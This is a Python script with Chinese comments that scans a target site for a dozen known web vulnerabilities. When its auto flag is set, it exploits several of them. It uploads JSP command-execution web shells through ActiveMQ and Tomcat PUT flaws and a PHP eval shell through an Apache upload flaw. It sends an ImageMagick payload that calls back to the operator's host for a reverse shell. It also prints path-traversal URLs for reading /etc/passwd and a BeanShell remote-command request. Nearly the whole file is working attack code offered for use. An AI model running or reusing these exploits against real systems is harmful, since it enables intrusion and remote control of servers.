from time import sleep
import requests
import socket
import re
from urllib.parse import urlparse

auto = 0
headers = {
    'Host':'',
    'User-Agent':'Mozilla/5.0 (Windows NT 10.0; WOW64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/57.0.2987.133 Safari/537.36',
    'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
    'Accept-Language': 'zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2',
    'Accept-Encoding': 'gzip, deflate'
}

def loudong_scan(url,Auto):

    global headers
    global auto

    auto = Auto
    
    res=urlparse(url)     
              # 获取域名
    if url[len(url)-1]== '/':       # 判断url后是否存在/
        url = url[:-1]

    headers['Host']=res.netloc      # 将域名加入Host

    scan_cve_2016_3088(url)
    sleep(1)
    scan_cve_2017_12615(url)
    sleep(1)
    scan_cve_2017_15715(url)
    sleep(1)
    scan_tongda(url)
    sleep(1)
    scan_cve_2018_8715(url)
    sleep(1)
    scan_cve_2018_3760(url)
    sleep(1)
    scan_ssrf(url)
    sleep(1)
    scan_cve_2020_17530(url)
    sleep(1)
    scan_gitea(url)
    sleep(1)
    scan_cve_2016_3714(url)
    sleep(1)
    scan_cve_2018_1273(url)
    sleep(1)
    scan_fanwei(url)

# cve-2016-3088
#################################################################################
def scan_cve_2016_3088(url):
    '''
    cve-2016-3088漏洞扫描
    '''

    global auto
    global headers

    test_url = url + '/fileserver/a/b'
    header = headers

    r = requests.put(test_url,headers=header)
    
    if int(r.status_code) == 500:
        print("[+] 存在 cve-2016-3088 漏洞")
        path = re.findall(r"(.*)fileserver",r.reason)[0]
        print("[+] 发现绝对路径： "+path)
        if auto == 1:
            use_cve_2016_3088(url,path)
    else:
        print("[-] 不存在 cve-2016-3088 漏洞")

def use_cve_2016_3088(url,path):
    '''
    cve-2016-3088漏洞利用 
    '''
    global headers
    header = headers
    message='<%if("023".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>'
    test_url = url + '/fileserver/a.txt'
    r = requests.put(test_url,headers=header,data=message)
    if int(r.status_code) == 204:
        print("[+] 木马上传成功！")
        header['Destination']='file://'+path+'/admin/indexs.jsp'
        sleep(1)
        r = requests.request('MOVE',url=test_url,headers=header)
        if (r.status_code == 204):
            print("[*+*] 木马移动成功！")
            print("[*+*] 漏洞利用成功！ 木马位置： " + url+'/admin/indexs.jsp?pwd=023&i=' + '命令')
    else:
        return


# cve-2017-12615
###########################################################################################
def scan_cve_2017_12615(url):
    '''
    cve-2017-12615漏洞扫描
    '''
    global auto
    global headers

    test_url = url + '/indexs.jsp/'
    header = headers

    r = requests.put(test_url,headers=header)
    
    if int(r.status_code) == 204:
        print("[+] 存在 cve-2017-12615 漏洞")
        if auto == 1:
            sleep(1)
            use_cve_2017_12615(url)
    else:
        print("[-] 不存在 cve-2017-12615 漏洞")

def use_cve_2017_12615(url):
    '''
    cve-2017-12615漏洞利用 
    '''
    global headers
    header = headers
    message='<%if("023".equals(request.getParameter("pwd"))){java.io.InputStream in = Runtime.getRuntime().exec(request.getParameter("i")).getInputStream();int a = -1;byte[] b = new byte[2048];out.print("<pre>");while((a=in.read(b))!=-1){out.println(new String(b));}out.print("</pre>");}%>'
    test_url = url + '/indexs.jsp/'
    r = requests.put(test_url,headers=header,data=message)
    if int(r.status_code) == 204:
        print("[*+*] 木马上传成功！")
        print("[*+*] 漏洞利用成功！ 木马位置： " + url+'/indexs.jsp?pwd=023&i=' + '命令')
    else:
        return

# cve-2017-15715
#############################################################################################
def scan_cve_2017_15715(url):
    '''
    cve-2017-12615漏洞扫描
    '''
    global auto
    global headers

    test_url = url
    header = headers
    header['Content-Type']='multipart/form-data; boundary=---------------------------12826589006978002593886762885'
    message = '''
-----------------------------12826589006978002593886762885
Content-Disposition: form-data; name="file"; filename="indexs.php"
Content-Type: application/octet-stream

<?php phpinfo();?>
-----------------------------12826589006978002593886762885
Content-Disposition: form-data; name="name"

indexs.php

-----------------------------12826589006978002593886762885--
'''
    r = requests.post(test_url,headers=header,data=message)
    if int(r.status_code) == 200 and len(r.text)== 0 :
        print("[+] 存在 cve-2017-15715 漏洞")
        if auto == 1:
            sleep(1)
            use_cve_2017_15715(url)
    else:
        print("[-] 不存在 cve-2017-15715 漏洞")

def use_cve_2017_15715(url):
    '''
    cve-2017-15715漏洞利用 
    '''
    global headers
    header = headers
    header['Content-Type']='multipart/form-data; boundary=---------------------------12826589006978002593886762885'
    message = '''
-----------------------------12826589006978002593886762885
Content-Disposition: form-data; name="file"; filename="indexs.php"
Content-Type: application/octet-stream

<?php @eval($_POST['attack']);?>
-----------------------------12826589006978002593886762885
Content-Disposition: form-data; name="name"

indexs.php

-----------------------------12826589006978002593886762885--
'''
    r = requests.post(url,headers=header,data=message)
    if int(r.status_code) == 200 and len(r.text)== 0 :
        print("[*+*] 木马上传成功！")
        print("[*+*] 漏洞利用成功！ 木马位置： " + url+'/indexs.php%0A' + ' 密码：attack')
    else:
        return

# 通达OA未授权登录
###################################################################
def scan_tongda(url):
    '''
    cve-2017-12615漏洞扫描
    '''
    global auto
    global headers

    test_url = url + '/logincheck_code.php'
    header = headers
    message= 'UID=1'

    r = requests.post(test_url,headers=header,data=message)
    
    if int(r.status_code) == 200:
        print("[+] 存在 通达OA未授权登录 漏洞")
        if auto == 1:
            sleep(1)
            print('[*+*] 获取到COOKIE: '+r.cookies)
    else:
        print("[-] 不存在 通达OA未授权登录 漏洞")

# CVE-2018-8715
##################################################################
def scan_cve_2018_8715(url):
    '''
    CVE-2018-8715漏洞扫描
    '''
    global auto
    global headers

    header = headers
    header['Authorization']='Digest username=admin'

    r = requests.post(url,headers=header)
    
    if int(r.status_code) == 200 and r.cookies == 'PHP*':
        print("[+] 存在 CVE-2018-8715 漏洞")
        if auto == 1:
            sleep(1)
            print('[*+*] 获取到COOKIE: '+str(r.cookies))
    else:
        print("[-] 不存在 CVE-2018-8715 漏洞")

# CVE-2018-3760
##################################################################
def scan_cve_2018_3760(url):
    '''
    CVE-2018-3760漏洞扫描
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/assets/file:%2f%2f/etc/passwd'
    r = requests.get(test_url,headers=header)
    if int(r.status_code) == 500 and str(r.text).find('/usr/src/') > 0:
        print("[+] 存在 CVE-2018-3760 漏洞")
        if auto == 1:
            sleep(1)
            print('[*+*] 使用 %252e%252e/ 可向上级目录跳转')
            print('[*+*] eg: passwd文件读取方法：'+url+'/assets/file:%2f%2f/usr/src/blog/app/assets/images/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/%252e%252e/etc/passwd')
    else:
        print("[-] 不存在 CVE-2018-3760 漏洞")

# SSRF漏洞
################################################################
def scan_ssrf(url):
    '''
    SSRF漏洞扫描
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/testhook.php'
    message='handler=file:///etc/passwd'
    r = requests.post(test_url,headers=header,data=message)
    if int(r.status_code) == 200 and str(r.text).find('root:x:0:0:root:/root:/bin/bash') > 0:
        print("[+] 存在 SSRF漏洞")
        if auto == 1:
            sleep(1)
            print('[*+*] post包中增加handler=file://目录可读取文件或利用gopher协议反弹shell')
    else:
        print("[-] 不存在 SSRF漏洞")

# CVE-2020-17530
################################################################
def scan_cve_2020_17530(url):
    '''
    CVE-2020-17530漏洞扫描
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/?id=%25%7b+%27test%27+%2b+(11+%2b+11).toString()%7d'
    r = requests.post(test_url,headers=header)
    if int(r.status_code) == 200 and str(r.text).find('test22') > 0:
        print("[+] 存在 CVE-2020-17530 漏洞")
    else:
        print("[-] 不存在 CVE-2020-17530漏洞")

# gitea 2.5未授权远程代码执行
################################################################
def scan_gitea(url):
    '''
    gitea 2.5未授权远程代码执行漏洞
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/linuxlz/JiangBuLiu.git/info/lfs/objects'
    message='''
    {
    "Oid": "....../../../etc/passwd",
    "Size": 1000000,
    "User" : "a",
    "Password" : "a",
    "Repo" : "a",
    "Authorization" : "a"
}
'''
    r = requests.post(test_url,headers=header,data=message)
    if int(r.status_code) == 401:
        sleep(1)
        test_url = url + '/JiangBuLiu/JiangBuLiu.git/info/lfs/objects/......%2F..%2F..%2Fetc%2Fpasswd/sth'
        r = requests.get(test_url,headers=header)
        if int(r.status_code) == 200:
            print("[+] 存在 gitea 2.5未授权远程代码执行漏洞")
        else:
            print("[-] 不存在 gitea 2.5未授权远程代码执行漏洞")
    else:
        print("[-] 不存在 gitea 2.5未授权远程代码执行漏洞")

# CVE-2016–3714
################################################################
def scan_cve_2016_3714(url):
    '''
    CVE-2016–3714漏洞
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/upload.php'
    myname = socket.getfqdn(socket.gethostname(  ))
    myaddr = socket.gethostbyname(myname)
    header['Content-Type'] = 'multipart/form-data; boundary=---------------------------293582696224464'
    message='''
    -----------------------------293582696224464
Content-Disposition: form-data; name="file_upload"; filename="CVE-2016-3714.jpg"
Content-Type: image/jpeg

push graphic-context
viewbox 0 0 640 480
fill 'url('''+url+'''/joker.jpg"|curl "'''+myaddr+''':3333)'
pop graphic-context
-----------------------------293582696224464--
'''
    r = requests.post(test_url,headers=header,data=message)
    if int(r.status_code) == 200:
        print("[+] 存在 CVE-2016–3714漏洞")
        if auto == 1:
            print("[*+*] 请使用nc -lvnp 3333命令监听即可接收到shell")
    else:
        print("[-] 不存在 CVE-2016–3714漏洞")

# CVE-2018-1273
############################################################
def scan_cve_2018_1273(url):
    '''
    CVE-2016–3714漏洞
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/users?page=&size=5'
    header['Content-Type'] = 'multipart/form-data; boundary=---------------------------293582696224464'
    message='username[#this.getClass().forName("java.lang.Runtime").getRuntime().exec("cat /etc/passwd")]=&password=&repeatedPassword='
    r = requests.post(test_url,headers=header,data=message)
    if int(r.status_code) == 200 and str(r.text).find('root:x:0:0:root:/root:/bin/bash')>0:
        print("[+] 存在 CVE-2016–3714漏洞")
    else:
        print("[-] 不存在 CVE-2016–3714漏洞")

# 泛微OA远程命令执行
#############################################################
def scan_fanwei(url):
    '''
    泛微OA远程命令执行漏洞
    '''
    global auto
    global headers

    header = headers
    test_url =url +'/weaver/bsh.servlet.BshServlet'
    r = requests.get(test_url,headers=header)
    if int(r.status_code) == 200 and str(r.text).find('BeanShell Test Servlet')>0 and str(r.text).find('Script Output')>0:
        print("[+] 存在 泛微OA远程命令执行漏洞")
        if auto == 1:
            sleep(1)
            print(''''
            Payload：
            POST /weaver/bsh.servlet.BshServlet HTTP/1.1
            Host: XXX:80
            Content-Length: 100
            Cache-Control: max-age=0
            Upgrade-Insecure-Requests: 1
            Origin: http://XXX:80
            Content-Type: application/x-www-form-urlencoded
            User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/89.0.4389.82 Safari/537.36
            Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,image/apng,*/*;q=0.8,application/signed-exchange;v=b3;q=0.9
            Referer: http://39.82.235.26:8081/weaver/bsh.servlet.BshServlet
            Accept-Encoding: gzip, deflate
            Accept-Language: zh-CN,zh;q=0.9,en;q=0.8
            Cookie: JSESSIONID=abcTzJIUGZOPw7CR22uGx; testBanCookie=test
            Connection: close

            bsh.script=eval%00("ex"%2b"ec(\"whoami\")");&bsh.servlet.captureOutErr=true&bsh.servlet.output=raw
            ''')
    else:
        print("[-] 不存在 泛微OA远程命令执行漏洞")